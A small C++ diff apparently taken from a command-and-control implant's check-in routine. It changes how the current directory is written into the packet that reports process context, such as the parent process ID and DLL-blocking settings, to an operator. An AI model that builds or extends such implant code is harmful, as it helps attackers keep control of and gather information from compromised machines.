@@ -71,8 +71,8 @@ auto DECLFN Transport::Checkin(
     // process context informations
     Self->Pkg->Int32( CheckinPkg, Self->Config.Ps.ParentID );
     Self->Pkg->Int32( CheckinPkg, Self->Config.Ps.Pipe );
-    if   ( ! Self->Config.Ps.CurrentDir ) Self->Pkg->Str( CheckinPkg, "" );
-    else Self->Pkg->Str( CheckinPkg, Self->Config.Ps.CurrentDir );
+    if ( ! Self->Config.Ps.CurrentDir ) Self->Pkg->Str( CheckinPkg, "" );
+    else Self->Pkg->Wstr( CheckinPkg, Self->Config.Ps.CurrentDir );
     Self->Pkg->Int32( CheckinPkg, Self->Config.Ps.BlockDlls );
 
     // additional machine informations
